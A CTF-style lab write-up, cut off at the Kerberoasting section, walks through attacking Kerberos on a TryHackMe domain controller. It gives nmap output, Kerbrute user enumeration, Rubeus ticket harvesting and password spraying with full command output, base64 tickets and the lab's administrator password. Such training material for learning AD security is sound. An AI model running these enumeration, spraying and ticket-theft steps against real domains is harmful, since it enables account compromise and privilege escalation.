# TryHackMe's Attacking Kerberos Lab Write-up
>Written by Herman Detwiler | 8/2/2021

*Learning how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller*

### Table of Contents
- [Introduction](#Introduction)
- [RECON](#RECON)
- [Enumeration with Kerbrute](#Enumeration-with-Kerbrute)
- [Harvesting and Brute-Forcing Tickets with Rubeus](#Harvesting-and-Brute-Forcing-Tickets-with-Rubeus)
- [Kerberoasting with Rubeus and Impacket](#Kerberoasting-with-Rubeus-and-Impacket)
- [AS-REP Roasting with Rubeus](#AS-REP-ROASTING-with-Rubeus)
- [Pass the Ticket with mimikatz](#Pass-the-Ticket-with-mimikatz)
- [Golden and Silver Ticket attacks with mimikatz](#Golden-and-Silver-Ticket-Attacks-with-Mimikatz)
- [Kereros Backdoors with Mimikatz](#Kerberos-Backdoors-with-Mimikatz)
- [Conclusion](#Conclusion)

Introduction
======================================================================================================
This lab will cover the basics of attacking Kerberos, the windows ticket-granting service.

This Lab Covers

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and impacket
- Golden and Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room is related to real-world applications and is a starting point for learning how to escalate privileges to that of a domain admin by attacking Kerberos and taking control of a network.

It is recommended to have a general knowledge of post-exploitation, active directory, and the windows command line.

## What is Kerberos

Kerberos is the deault authentication service for Microsoft Windows domains. It is meant to be more secure than NTLM by using third part ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

### Common Terminology

- **TGT** *Ticket Granting Ticket* : A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.

- **KDC** *Key Distribution Center* : The key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.

- **AS** *Authentication Service* : The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

- **TGS** *Ticket Granting Service* : The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.

- **SPN** *Service Principal Name* : A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SON set.

- **KDC LT Key** *Key Distribution Center Long Term Key* : The KDC key is based on the KRBTGT service account.  It is used to encrypt the TGT and sign the PAC

- **Client LT Key** *Client Long Term Key* : The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.

- **Service LT Key** *Service Long Term Secret Key* : The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.

- **Session Key** issued by the KDC when a TGT is issued.The user will provide the session key to the KDC along with the TGT when requesting a service ticket

- **PAC** *Privilege Attribute Certificate* The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### **AS-REQ** with Pre-Authentication in Detail

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps.

1. user encrypts a timestamp NT hash and sends it to the AS
2. The KDC attempts to decrypt the timestamp using the NT hash from the user, 
3. If successful the KDC will issue a TGT and a session key for the user.

### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets comes from: the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Example TGT
---

***Encrypted using KDC LT Key***
- Stat/End/Max Renew: 10/31/2021: 1:36; 10/31/2021: 11:36.....
- Service Name: krbtgt: example.local
- Target Name: krbtgt: example.local
- Client Name: user; example.local
- Flages: ooeoooooo
- Session key: ooooxooooooo 12ev21212....

Privilege Attribute Certificate
- Username: example
- SID: S-o-5-45.......

[x] Signed with Service LT key

[x] Signed with KDC LT key

---

<img src="https://upload.wikimedia.org/wikipedia/commons/2/26/TGTplay.gif" />

### Service Ticket Contents
Contains two parts

1. **Service Portion**
: User Details, Session Key, Encrypts the ticket with the service account NTLM hash

2. **User Portion**
: Validity Timestamp, Session Key, Encrypts with the TGT session key.

### Kerberos Authentication Overview
- AS-REQ*uest*-1. The client requests an Authentication Ticket or Ticket Granting Ticket *TGT*
- AS-REP*ly*   2. The Key Distribution Center verifies the client and sends back an encrypted TGT
- TGT-REQ*uest*3. The client send the encrypted TGT to the ticket Granting Server with the SPN or the service the client wants to access
- TGS-REP*ly*  4. The Key Distribution Center KDC verifies the TGT of the user and that the user has access to the servicem then sends a valid session key for the service to the client
- AP-REQ*uest* 5. The client requests the service and sends the valid session key to prove the user has access
- Ap-REP*ly*   6. The service grants access.

### Kerberos Tickest Overview

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

### Attack Privilege Requirements

- **Kerbrute Enumeration** - No domain access required 
- **Pass the Ticket** - Access as a user to the domain required
- **Kerberoasting** - Access as any user required
- **AS-REP Roasting** - Access as any user required
- **Golden Ticket** - Full domain compromise (domain admin) required 
- **Silver Ticket** - Service hash required 
- **Skeleton Key** - Full domain compromise (domain admin) required



RECON
======================================================================================================

### Nmap Results
**Open Ports**

```nmap
Discovered open port 22/tcp on 10.10.53.187
Discovered open port 445/tcp on 10.10.53.187
Discovered open port 3389/tcp on 10.10.53.187
Discovered open port 135/tcp on 10.10.53.187
Discovered open port 53/tcp on 10.10.53.187
Discovered open port 139/tcp on 10.10.53.187
Discovered open port 88/tcp on 10.10.53.187
Discovered open port 593/tcp on 10.10.53.187
Discovered open port 3269/tcp on 10.10.53.187
Discovered open port 3268/tcp on 10.10.53.187
Discovered open port 464/tcp on 10.10.53.187
Discovered open port 389/tcp on 10.10.53.187
Discovered open port 636/tcp on 10.10.53.187
```

**Discovered Services**

```python
PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBYAa9AZBsEOwCK/28ymk+6ZkIdxdK3dfRnFaUZHlSqUgdz5Fjn/wyUeuAChlOvF6yjcGtcqvx62/Cw8ngaubb9B7QYt8XWGy4aFRL/IYX0O7MiEJQ6YIPGYKQSOs2m/F07FrQPLnzytQ3oh0Gkl6zpOEGtcPYa8BtFj6vpdVthaDipnm4TetegdwUAeRpq1m9chBWONPfU0syMn2TuA8jw+sFIkOCE+x+ylOjHeJ63ncdvrvPeUSkwD//qeOg6JdwaDk3jdtuKxphxkczsc2VvU/OeJ8wW7MMQy2nO1JZTCtrWlms8d2+j1V8pR+fhLIuKu+JpwbLqgr5jieB1CIl
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCGER+LQSfN21aCiK2J5UoJ7elNly98IB2TIQejTa/vdve8vfzhOcZNkdmCRcwcfqvmMM7eScuhnyuV2l34lDoE=
|   256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkJkzX/eHfebkreDRkbu0WtQB1EnQtRuYvx3rooVnqm
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-08-04 15:23:20Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-04T15:23:25+00:00
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Issuer: commonName=CONTROLLER-1.CONTROLLER.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-03T14:13:31
| Not valid after:  2022-02-02T14:13:31
| MD5:   1499 5129 24fd 6dfb be1f 25ee 7b35 65c6
| SHA-1: ae7c 317e 71af 89ff aa43 8034 359e 0f86 5e6d d48f
| -----BEGIN CERTIFICATE-----
| MIIC/jCCAeagAwIBAgIQcPG6j9NR2YhKWwJpr8KG9jANBgkqhkiG9w0BAQsFADAo
| MSYwJAYDVQQDEx1DT05UUk9MTEVSLTEuQ09OVFJPTExFUi5sb2NhbDAeFw0yMTA4
| MDMxNDEzMzFaFw0yMjAyMDIxNDEzMzFaMCgxJjAkBgNVBAMTHUNPTlRST0xMRVIt
| MS5DT05UUk9MTEVSLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEApFFetGqSDkwTeVJBnSTxkQL14FkgXghpTsBwW5ehPS00BoxDeUs5To6enRbO
| eeDtZqpT6YVYaOaZrNO7MVVO0DmnFU+0CNwv7U3wRDnZ3IBT0xI/NUWmenTgWVAa
| 8eRI/Bo4s8sdnIZeMJhkoEeNP1lHvW8PJ+U1sJlkQ+rIsqzl0hY4i3bPrT+TbXNr
| DTrcozggyelQA6QuVRBMAZv0tx9CO5Qy4/fHIMxeWnQ/HMnGJGFHLUNsvQo//fz4
| 93FiW4pEN3g7cCOotbBoJ2SittHBnz2UzPCVya2LLgwZSMC20Xf1RRPvlUDlX4Y5
| OVLJiebrh1bLivonZN+Yj68lvQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAABP909fAz29d4/waYXv
| NUpEFr059pKNhP8H5G8S9HHx7AWulaK1v9oD9YTwj7WXvWnbnV4jXdJ/t5Buc20N
| wxypAICiiWo+TNoVrdI3T4VAbv4oE0HOkV8A0hKbO8WB3o/GJdtfGajxbKgSdng+
| vczPpXsAzkET43w47mIedbOWncEHO+ZQXI9lSiawkJ6Q5w7bBfm42c2Fpc7Qnehr
| a0GXOZy37nKQ/Z8sX3sqbcfhzcFubvBEVv5TPtTLacg6MTYNnmQypBT1Zd7HrdK5
| IpEkrWoobWwABVEIFaTnoAufJ+UEwIEgr2Hs2f/Ef4q/H32Lb0kjEfGl1pB4On4N
| 6ag=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-04T15:23:34+00:00; +1s from scanner time.
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63676/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35663/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15536/udp): CLEAN (Timeout)
|   Check 4 (port 49690/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-04T15:23:26
|_  start_date: N/A

```
Enumeration with Kerbrute
=============================================================================================================================================

### Overview

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.


For this lab you need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.53.187  CONTROLLER.local

### Git addr

`https://github.com/ropnop/kerbrute/releases`

### Usage

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local usernames.txt
```

`./kerbrute` Execute kerbrute 

`userenum` In user enumeration mode

`--dc CONTROLLER.local` To domain controller named "CONTROLLER.local" 

`-d CONTROLLER.local` To the domain with the same name (in this case)

`usernames.txt` and use our supplied list of possible usernames.

### Kerbrute Results

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/21 - Ronnie Flathers @ropnop

2021/08/04 11:53:54 >  Using KDC(s):
2021/08/04 11:53:54 >   CONTROLLER.local:88

2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/08/04 11:53:55 >  Done! Tested 100 usernames (10 valid) in 0.852 seconds
```
### Questions


1. How many total users do we enumerate?
: 10

2. What is the SQL service account name?
: sqlservice

3. What is the second "machine" account name?
: machine2

4. What is the third "user" account name?
: user3

Harvesting and Brute-Forcing Tickets with Rubeus
=============================================================================================================================================

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

*To start this task you will need to RDP or SSH into the machine your credentials are*
:

Username: `Administrator` 

Password: `P@$$W0rd` 

Domain: `controller.local`

Machine IP is `10.10.53.187`    

### Harvesting Tickets

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

Rubeus is already compiled and on the target machine and cab be found in the Downloads folder.

**USAGE**
: `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (8/4/2021 12:08:18 PM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  8/4/2021 11:58:41 AM                                                          
  EndTime               :  8/4/2021 9:58:41 PM                                                           
  RenewTill             :  8/11/2021 11:58:41 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEiF2tQH5uEhFbFkJRJcrdqXoZ/tOuG3st4m9 
    /PkKNx4dUxygzhMq7VnimLy2rxr/cb/ZPd+eGWujsKLlHzCg4Ty0MWcDRTx1ewdtU0aFAEdX6nNsX8pMCpAGdlk+pZk2fxcsw1kS 
    pOqfAeouD2CPHxxZwBGlkGVtoirgwSFwkpR9aNYa7+YwNjGhjjZPZc8A+Sy3TQHrhB2NeMhl0QV1iweAnL7xsLH+6D3Dg/sPDPf1 
    mSja2xmXdnV/Uu6oKipg6j1gUSdKrYF2mP3fFccNvQ8CSRN9kLTbd97YY13RhiFnffNYeYrGv40BTi0ymWhP0CUzogetAcW60bhv 
    +aPW4ifOo+OUUiL7BPqwB0ZJ5k7ghF3InLzPSyWiQxYZwGkiGnIG1LYKoSKa2jmzlHDF8OR8mejAcRXja4Wu9WzNu1bhbO9i4Xa/ 
    poZ94M02Tqfp6bYRhZuryYAMo8c0J43i2/l3AfYW2n0XU9mIQEGj4U/mcFhUy8mro2J8tGZXymNyfx/zV56cAW14kkSAoOZZvTuf 
    kmUSJ0GyvsOnIg37SbSI1GZ9ILod3hTXgIIpTOkcr0mUvZ7+LhYqvVVekZ8QB5pHzkd6dlh+ZMKxQjyo8IB83KBl21yGGSJXf6Fv 
    t5UKmOdbUGTogItMtZNTz7WjOb+krKAeQzgqEBdGTye0EfqyXUkWMe9cy3qL5AAHCLKogQ7jBNFryzuXtnB2CMhsuRtC9JvPBu75 
    JlAnTitprvDTuNYuPO0fimCifztDntGpkOODyMhcB9OAwsifLT4Rq/8EzTk6ij7y3+bjQMFWUjT0Bwn5haRnKVEZLkZSqEwLSBYe 
    fBR3xSiwmbJub2OKgTlS2lOhw+jM+VJ0zuVqjz6P0FxNWxTgSOI090Sy80h5Nq4rZPVOFcuQt3OYDrJXw0HqekXiijMknS8NsEgR 
    SrBWr7UjvkxM+JDeBKknPLgKvMkrD24jqPIF48EhaOAVZe3S0prWCEOZZRWPZDcuZOD0eXCkc5nxFatX+3oO6fT0kuh2s4eRFrqh 
    sjG011r/UErjcU7N5jzPu+qWvUCcv2Sd0xhDA6/ygyZLffCAqnjKKB4Ie7P8Tk9ejwfEdKoBhKAiOWFEy8F7R7CbGPcoCjWARzvu 
    HtzpT/m5JPQBaQkhTqOF8IVkKYMuR1ufkvLUxZlSkPxwavICiam552AyiMObw3dTdZfhqSrKNCPvsXRSbp8KYH6T4u6bBjc6LqHY 
    cSceZdGQ8OPQFN0hkvsJYs3OjW8O2DHfDr3yQuIMsQWdYHdYtkMd20BiLtz18O0kdUltKwXfZynL7whCABZM/rqWMzIDV7HEg20y 
    MVSjjhpTwkmEVG9nZVv3GyOxLn3cde4GCyX3HcVPnFwUpfqS5KvwrAKjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr 
    MCmgAwIBEqEiBCDy9dPozcZuNE83V43G4PI77d2lH7k3FbnpB4R1nSQepqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw 
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDgwNDE4NTg0MVqmERgPMjAyMTA4MDUwNDU4NDFapxEYDzIwMjEwODEx 
    MTg1ODQxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM 
    
    User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/4/2021 12:00:14 PM
  EndTime               :  8/4/2021 10:00:14 PM
  RenewTill             :  8/11/2021 12:00:14 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :
  
    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGls9kQ/Yv3FJniSj3M/OKTagKGbS/FTdqIH6
    I0qCmjBq4j2qaS2htc8sYXjcDf/KHY26BQepXJhqbivW/ywjSa/Ui7aHE7cySOlGEzAEuFi3gnnyBJpFMAvngEDR61wnVSxO0pXE
    yw+N0tX8hwBLS+WCzmd150t3kDbVH/a3QKcZyQkOTR5elPeIe6wdk/k8U56esLdM8ln+MgeNhh9srLYc6/I8xw6O8NQfDOSSQi6I
    zGZU78QY5exMbjLrapo+M5h3l+byLJdzPIeqzPk4Wq7bc75hkQrrS+g3HgQm4e4rlZVy5X/Bqc3GpsbiMpkFichFvzThDvIjmhsR
    XfOCniXze7+8k4d9N5pF2uW9oJS9FMQDsXVIQBEv0foz3X9sLATbHXLgqd0XlBh7WvzTrxvp+2YR0gKMUapeSD+Zob3gRF1BgEvo
    Nk4R/S9X1T5AuqqkmPRj6M6KzmCkJKmtC7pmjo/mQ2ahunImVrf8+e/swVuN4Uq4HmH+sFyckNSvLNn/ldZaDwznhq0SrGnspFN7
    I3tibVC375j6S2T4MGg8PUv+JMGQM84PZBgVaRtZdpK7kMM+TuLZozZ/gInJVauQ11t+a2gJTvNX/ACl4PI/39e6kdfZeFp2B72K
    J2acwy9X3m49d4RAyVJMVOlNkAIYYmrS16Xc+JNHxkrAQfH7uyRFh5idZqpOyAQF+LTPH/bZfipWDzyrwpYap6M5bXNUTZlwTNhp
    AgE9RmZ+IrM16mHZMYTLrQi1c0/BSS4dOcvUZcqFfI7VkIrt+Qr4Rf6SmWRtjtKiLjF7pufozQUT9zKh81gZaethsE9XnnnnpndL
    lsEvzNQIejjC3TyNN7d6GQ90RdiRt/nTAd74+di4cGv4ezZTWt8xVLWdwRydyP6F0SpA47S2/0jH+5NsRVbLMEeQrUDXBphdZlss
    ha1mqgxihBlq8/ehed9UKHbe6SNowUeyQJuOr7wSIl5bl1dPxfLBmhqrl4dzy8AeX62uKRxl9+pcUQAOnNicqsPCDTJBc9AM/T/K
    phEaAn5CVSOvEBOld7PUan9Q34RzCp740xPB5nb3Mjq7QbGeUi/1U2CtO4+ygYiGsyihehegHNCSI6e11GVA9doxvV7ztt1aJ2Fv
    MA7yhpGqbr1b3Lkb0jN7Mf+M7tS93MI9xjhSL/wHrTmezWicLWIimiOQlvMKIT6C+0MmvQyF5ZgtlwirWYUTIyHgbqMmGZmiJgCY
    Xf5zAbHLEFCiW9MdrnWrETCnbHIBy58C2fb3Er1kbhZ57iyvsP6BGYH/YYLMyk/FnpyZG37Z2tiEQ4zXZCqB1m2PlQL90wkFq20k
    cK3PExzWAt4ucQZESOnQcmxFaagDj0RyJcHR2Adi196g5YKvrFnXRPvkfUDMFUpyeqOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIGN2NRrt4LzVadN0FxZJCFrV55b86+sHle1GvKkJx+cYoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwODA0MTkwMDE0WqYRGA8yMDIxMDgwNTA1MDAxNFqnERgP
    MjAyMTA4MTExOTAwMTRaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=
    
```    
### Brute forcing and password spraying with Rubeus
    
   Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

`echo 10.10.53.187 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

**USEAGE** 
: `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user. 

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticke
t

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7YHLo2VEVuyhkFD7gzN0e274jDt1ZVm/LtZigOXt2XerHMMAivRo6s6Ly2XCgQNoS8gajgFd/0yp
      lJhzL/SSWxIeOkGgfqReK0dT+UkZYdIe/5SCtCXx2YhKJ/SZCewjP1xKl3Mvq/ASD41KRkwZwEZQm0Uv
      s+rkNQqSFGIx2jKqNMAMZ4KII8iXJSApRCwbXM/YQLpEh4+dN1ZVkgiRxn9hJ3GBlH67XArKwOmbw5Bc
      +zJH97yEkPzu6b4UIOmzKS1H72cRwjNWvK8bwZzSQ9bPsBHuDsjHjs/7b+jSjT9oiYswzJ97mMY/MSpo
      1lC2/8JDM10weD9U4TGFQGJW39qhlkl/Hp8G+nbpY1LyibT4bvXsUGVeiwjl8u3tEQkAPED3pW7tPhJ0
      sUsiMU/zIadZgQu/2Am9IvrtK4PW6M62+Z9H0FIfrULf/60l0aqezrapn3SqRY8vli4oqTuLbfPv/enl
      ZaxPMR64wZrdL/r/VaCmIEnuuyQEFvDkrmA5wFajUynHovYyBcpmRoCUO3htQllLEP3mct2zVi8rSkOq
      3wap9Iu+iIudWYVsfMjXg+oJ40C5qI0V551FFJGb9INdmfQNSH2zAfAr4lb5yyGXuhPbisBj0mc9S+Mg
      AGKhlyheLF2Xn2EvHbfDESJq3VOukVvVsSLeYOOC6gOl8GZMV2LjqEgxK03/u5DTgkDfS0PtnhJIaVbZ
      FO37zSqWtieuKwH7GvbOG1lIWXKZxZpvt5Rw6Kjgg/9orFEaEUFNOj5UFkg8p/bVD051XUVJttUxg3S1
      4LLLvqPUDHOZ1V9O5erAFunSDT8FUdUHj7Q0uDtbeIu/nHIrHn1P2eTC1i0J3BUlAW8mQgBU06M34Ofo
      4ZqZr0Qpj4JoStg0+jtkSV1yVCSxOI4DG86DXcg9xitYR8XR0ngn12xXVya5GqoEre6a5QKcSeR5u7iU
      vWhGWnQ4JZHBjf5A+rVCnAQcbjYueGiHh8NxmoD/SLgK/UIOMZCcL4BsRkY/IzYvvJ8hWV2CE/uWKZr+
      IhUM+IFOFvt3jW9YfAhws0dlhFSBNFD8u0xmTPA8NrkuRRt11BMbkA81UqSqM+L1ZXalLR74X8EEwJOX
      qFAWLXHVATxifNduAabHEamBcBc9P1rKhzpENL2oWXOFKcLoIRjjWlI28BwDoOv/xWij3RKL44tVMH2Y
      fKj4NQhe9Ix2Pnc0C7M0dGgH/GlcF8T5xtXEIw4Lwo+Q2xe7ckdidFpcmLiBq3JyqIlgzYAheD5D5jo9
      y9YDLRXrZrCv9M8bNkrSuWEo+T46hS0+qVll4HLJHbpkOk42w3X/NVykNEDdUDe/46OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIK/HXXigV28dS3EyPBaifLRmxZLY9MI8xdQY
      eb1Ti6a9oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDgwNDE5MTg1M1qmERgPMjAyMTA4MDUwNTE4NTNapxEYDzIwMjEwODExMTkxODUzWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```
### Questions

1. Which domain admin do we get a ticket for when harvesting tickets?

Answer
: Administrator

2. Which domain controller do we get a ticket for when harvesting tickets?

Answer
: CONTROLLER-1


Kerberoasting with Rubeus and Impacket
============================================================================================================================================

### Overview

